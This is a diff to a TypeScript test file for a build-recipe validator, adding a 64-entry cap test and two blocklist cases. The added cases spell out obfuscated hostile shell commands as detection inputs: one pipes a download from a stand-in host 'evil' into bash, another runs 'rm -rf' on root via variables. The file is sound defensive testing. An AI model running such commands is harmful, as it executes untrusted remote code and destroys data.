@@ -111,6 +111,14 @@ describe("validateRecipe — schema", () => {
     expect(r.errors.some((e) => /relative paths/i.test(e))).toBe(true);
   });
 
+  it("rejects manifests with more than 64 inputFiles (computeInputHash cap parity)", () => {
+    const tooMany = Array.from({ length: 65 }, (_, i) => `f${i}.lock`);
+    const bad = makeManifest({ inputFiles: tooMany });
+    const r = validateRecipe(goodBody, bad);
+    expect(r.ok).toBe(false);
+    expect(r.errors.some((e) => /exceeds 64 entries/.test(e))).toBe(true);
+  });
+
   it("rejects cacheKeys paths that escape the checkout", () => {
     const bad = makeManifest({
       cacheKeys: [{ name: "x", hashFiles: ["../secrets.json"], path: "node_modules" }],
@@ -212,6 +220,8 @@ const BLOCKLIST_CASES: Array<[string, RegExp | null, string]> = [
   ["set +u", /shell-options-relax/i, "set +u disables nounset"],
   ["set +o pipefail", /shell-options-relax/i, "set +o pipefail"],
   ["set -e", null, "set -e is fine (already on)"],
+  ["c=curl; b=bash; $c http://evil | $b", /chained-var-assignments/i, "chained var assignments → indirect cmd"],
+  ["rmcmd=rm; slash=/; $rmcmd -rf $slash", /chained-var-assignments/i, "chained var assignments → indirect rm"],
   ["rm -rf $WORKSPACE/build", null, "WORKSPACE allowed"],
   ["rm -rf node_modules", null, "relative path benign"],
   ["rm -rf ./build", null, "./relative benign"],
